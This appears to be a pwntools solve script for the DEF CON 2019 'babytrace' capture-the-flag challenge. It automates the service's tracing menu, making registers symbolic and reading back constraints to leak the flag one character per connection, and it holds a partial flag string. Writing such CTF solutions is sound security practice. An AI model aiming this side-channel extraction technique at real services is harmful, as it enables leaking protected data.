from pwn import *
import string

"""
1 - before initial open
3 -  1007fa storing fd from open
6 -  100812 result from first read, right before our input
13 - 100873 move length into eax, right before check on input
14 - 10087e move length into eax, right after length check


Need to introduce uncertainty -> do so by making things symbolic prior to read

Need to get constraints to go to different values at different times ->

"""

regs = ["rax", "eax", "rbx", "ebx", "rcx", "ecx", "rdx", "edx", "rdi", "edi", "rsi", "esi"]

def is_hex(s):
     hex_digits = set(string.hexdigits)
     # if s is long, then it is faster to check against a set
     return all(c in hex_digits for c in s)

def read_start(r):
    # Read until binary program choice
    r.recvuntil("Choice:")
    r.sendline("2")

    # Read until start trace choice
    r.recvuntil("Choice:")
    r.sendline("1")

def give_unconstrained_input(r, name, length):
    assert length <= 8
    r.recvuntil("Choice: ")
    r.sendline("1")
    r.recvuntil("name:")
    r.sendline(name)
    r.recvuntil("bytes):")
    r.sendline(str(length))

def give_constrained_input(r, name, hexval):
    assert is_hex(hexval) and len(hexval) % 2 == 0
    r.recvuntil("Choice: ")
    r.sendline("2")
    r.recvuntil("name:")
    r.sendline(name)
    r.recvuntil("hex):")
    r.sendline(hexval)

def give_constant_input(r, hexval):
    assert is_hex(hexval) and len(hexval) % 2 == 0
    r.recvuntil("Choice: ")
    r.sendline("3")
    r.recvuntil("hex):")
    r.sendline(hexval)

def take_steps(r, i):
    assert isinstance(i, int)
    r.recvuntil("Choice:")
    r.sendline("1")
    r.recvuntil("steps:")
    r.sendline(str(i))

def concret_reg(r, reg_str):
    assert reg_str in regs
    r.recvuntil("Choice")
    r.sendline("5")
    r.recvuntil("name?")
    r.sendline(reg_str)

def symbol_reg(r, reg_str):
    assert reg_str in regs
    r.recvuntil("Choice")
    r.sendline("6")
    r.recvuntil("name?")
    r.sendline(reg_str)

def build_input(r, i):
    #give_unconstrained_input(r, "fin", 1)
    #   give_constrained_input(r, "first", '08')
    string = hex(i)[2:]
    if len(string) == 1:
        string = "0" + string
    string += "0"*6
    give_constant_input(r, string)
    #give_constrained_input(r, "middle", )

    #give_constrained_input(r, "coninput", "ff")
    #give_constant_input(r, "00")
    #give_unconstrained_input(r, "fin", 1)

    r.recvuntil("Choice:")
    r.sendline("0")
    pass

def get_contstraints(r):
    r.recvuntil("Choice")
    r.sendline("7")
    r.recvuntil("CONSTRAINTS")
    res = r.recvuntil("\n")
    res = chr(int(res.split(" ")[6],16))
    return res

def get_letter(i):
    #r = remote("localhost", 2015)
    r = remote("babytrace.quals2019.oooverflow.io", 5000)
    read_start(r)
    build_input(r, i)
    curr_regs = regs
    take_steps(r, 9)
    symbol_reg(r, "eax")
    take_steps(r, 2)
    concret_reg(r, "eax")
    symbol_reg(r, "eax")
    res = get_contstraints(r)
    r.close()
    return res

if __name__ == "__main__":
    win = "OOO{memory_objects_get_you_every_ti"
    while True:
        win += get_letter(len(win))
        print(win)
